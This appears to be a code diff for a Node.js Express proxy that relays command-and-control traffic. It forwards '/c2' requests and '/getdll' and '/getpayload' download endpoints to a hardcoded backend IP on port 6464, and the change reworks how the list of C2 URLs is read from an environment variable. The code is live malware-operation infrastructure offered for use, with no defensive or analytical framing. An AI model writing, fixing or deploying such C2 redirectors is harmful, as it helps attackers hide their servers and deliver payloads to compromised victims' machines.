@@ -5,28 +5,32 @@ const helmet = require('helmet');
 const app = express();
 const PORT = process.env.PORT || 10000; // Default to Render's standard port if not specified
 
+// Log environment variable for debugging
+console.log(`[Env Debug] TARGET_C2_URLS from env: ${process.env.TARGET_C2_URLS}`);
+
 // List of target C2 URLs for dynamic selection (can be overridden by environment variable)
-const TARGET_C2_URLS = process.env.TARGET_C2_URLS ? process.env.TARGET_C2_URLS.split(',') : [
-  'http://31.57.147.77:6464'
-  // Add more fallback URLs here if needed
-];
+let TARGET_C2_URLS = [];
+try {
+  if (process.env.TARGET_C2_URLS && typeof process.env.TARGET_C2_URLS === 'string') {
+    TARGET_C2_URLS = process.env.TARGET_C2_URLS.split(',').filter(url => url && url.trim().startsWith('http'));
+    console.log(`[Env Debug] Parsed TARGET_C2_URLS: ${TARGET_C2_URLS.join(', ')}`);
+  }
+} catch (err) {
+  console.error(`[Env Debug] Error parsing TARGET_C2_URLS:`, err);
+}
+
+// If no valid URLs from env, use default
+if (TARGET_C2_URLS.length === 0) {
+  TARGET_C2_URLS = ['http://31.57.147.77:6464'];
+  console.log(`[Env Debug] Using default TARGET_C2_URLS: ${TARGET_C2_URLS.join(', ')}`);
+}
 
 // Function to select a target URL (simple rotation or random selection)
 let currentTargetIndex = 0;
 function getCurrentTargetUrl() {
-  // Validate the list of target URLs
-  if (!TARGET_C2_URLS || TARGET_C2_URLS.length === 0) {
-    console.error('[Target URL Error] No target URLs defined. Using fallback.');
-    return 'http://31.57.147.77:6464';
-  }
   const targetUrl = TARGET_C2_URLS[currentTargetIndex];
   // Rotate to next target for the next request (simple round-robin)
   currentTargetIndex = (currentTargetIndex + 1) % TARGET_C2_URLS.length;
-  // Validate the selected target URL
-  if (!targetUrl || typeof targetUrl !== 'string' || !targetUrl.startsWith('http')) {
-    console.error(`[Target URL Error] Invalid target URL: ${targetUrl}. Using fallback.`);
-    return 'http://31.57.147.77:6464';
-  }
   console.log(`[Target URL] Selected target URL: ${targetUrl}`);
   return targetUrl;
 }
@@ -69,7 +73,7 @@ app.use((req, res, next) => {
 
 // Proxy middleware for /c2 endpoints
 app.use('/c2', createProxyMiddleware({
-  target: () => getCurrentTargetUrl(), // Dynamically select target URL
+  target: TARGET_C2_URLS[0], // Use first valid target as static default, avoiding dynamic issues
   changeOrigin: true,
   pathRewrite: {
     '^/c2': '' // Remove /c2 prefix when forwarding to target
@@ -105,7 +109,7 @@ app.use([
   '/getdll', '/Getdll', '/GETDLL',
   '/getpayload', '/Getpayload', '/GETPAYLOAD'
 ], createProxyMiddleware({
-  target: () => getCurrentTargetUrl(), // Dynamically select target URL
+  target: TARGET_C2_URLS[0], // Use first valid target as static default, avoiding dynamic issues
   changeOrigin: true,
   pathRewrite: (path, req) => {
     // Convert path to lowercase to match backend expectation if needed
